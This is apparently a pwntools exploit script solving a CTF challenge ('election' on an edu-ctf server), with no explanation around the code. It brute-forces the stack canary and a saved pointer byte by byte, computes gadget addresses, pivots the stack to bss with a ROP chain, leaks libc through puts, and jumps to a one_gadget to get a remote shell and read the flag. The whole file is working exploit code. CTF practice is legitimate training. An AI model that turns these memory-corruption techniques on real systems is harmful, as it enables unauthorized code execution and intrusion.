'/ The binary has full protection ! /'
_loc = False
from pwn import *
context(arch = 'amd64', os = 'linux')
r = process('./election') if _loc else remote('edu-ctf.csie.org', 10180)

def leak():
	r.sendafter('>','2')
	r.sendafter('token', b'\0'*0xb8)
	known = b''
	for j in range(0x10):
		for b in range(256):
			r.sendafter('>','1')
			Token = b'\0'*0xb8 + known + bytes([b])
			r.sendafter('Token', Token)
			if r.recvline().find(b'Invalid') < 0:
				r.sendafter('>','3')
				break
		known += bytes([b])
		success("found "+str(j+1)+" bits")
	return known

def robot( num ): # < 256
	for i in range(num // 10 + 1):
		r.sendafter('>','2')
		r.sendafter('token', str(i))
		r.sendafter('>','1')
		r.sendafter('Token', str(i))
		revote = 10 if (i+1)*10 <= num else num%10
		for _ in range(revote):
			r.sendafter('>','1')
			r.sendafter('choice','0')
		r.sendafter('>','3')

def attack( token, message ):
	r.sendafter('>','2')
	r.sendafter('token',token)
	r.sendafter('>','1')
	r.sendafter('Token',token)
	r.sendafter('>','2')
	r.sendafter('To','0')
	r.sendafter('Message',message)

leaked_info = leak()
canary = leaked_info[0:8]
csu_init = u64( leaked_info[8:16] ) # this is the stored rbp !!
codebase = csu_init - 0x1140
token_bss = p64( codebase + 0x202160 )
leave_ret = p64( codebase + 0x0ff9 )
pop_rdi = p64( codebase + 0x11a3 )
plt_puts = p64( codebase + 0x201f90 )
puts_leave_ret = p64( codebase + 0xc8a )
more_bss = p64( codebase + 0x202180 )
write_bss = p64( codebase + 0x1088 )

robot(0xff)
msg = b'\0'*0xe8 + canary + token_bss + leave_ret # stack migration
ROP1 = more_bss + pop_rdi + plt_puts + puts_leave_ret
ROP2 = more_bss + write_bss
attack( ROP1 + ROP2, msg[:-1] )
r.sendafter('>\n','3')

libcbase = u64( r.recv(6)+b'\0\0' ) - (0x6f690 if _loc else 0x809c0)
one_gadget = p64( libcbase + (0x4526a if _loc else 0x4f322) )
success( hex(libcbase) )
r.send(b'\0'*0x28 + one_gadget)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
